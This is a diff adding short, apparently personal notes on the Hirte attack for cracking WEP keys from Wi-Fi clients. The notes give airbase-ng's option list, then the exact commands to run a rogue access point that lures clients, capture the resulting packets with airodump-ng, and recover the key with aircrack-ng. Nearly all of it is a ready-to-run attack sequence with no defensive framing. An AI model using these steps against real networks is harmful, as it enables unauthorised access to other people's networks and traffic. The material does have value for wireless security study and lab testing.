@@ -1,0 +1,47 @@
+
+
+... hirte attack
+...
+... lets first create one access-point where we will lure client to connect
+... once any client connect there immidiately hirte attack will be imposed
+... on the clients. hirte attack is almost same as the caffe-latte attack.
+... but only exception is that packets are used as fragmentations and any 
+... number of packets will be used.
+
+... to create one fake or rouge access point we do the following.
+... to create one ap we will use the following options.
+
+airbase-ng --help
+
+  Airbase-ng 1.2 beta2 - (C) 2008-2013 Thomas d'Otreppe
+  Original work: Martin Beck
+  http://www.aircrack-ng.org
+
+  usage: airbase-ng <options> <replay interface>
+
+  Options:
+
+      -a bssid         : set Access Point MAC address
+      -W 0|1           : [don't] set WEP flag in beacons 0|1 (default: auto)
+      -v               : verbose (print more messages)
+      -c channel       : sets the channel the AP is running on
+      -L               : Caffe-Latte WEP attack (use if driver can't send frags)
+      -N               : cfrag WEP attack (recommended)
+
+      --help           : Displays this usage screen
+
+ # airbase-ng -c 3 -a aa:bb:cc:dd:ee:ff -e "Rokeya" -W 1 -N wlan0mon
+
+... on another window we will run the airodump-ng to capture the packets
+
+ # airodump-ng -c 3 --bssid aa:bb:cc:dd:ee:ff --write hirte_packets wlan0mon
+
+... once the client connect to this ap it will start hirte attack and start
+... capturing the file. from the file we can crack the key using the aircrack-ng
+
+ # aircrack-ng hirte_packets.cap
+
+... we can see the wep key if it is captured during the packets capturing sessions.
+
+
+
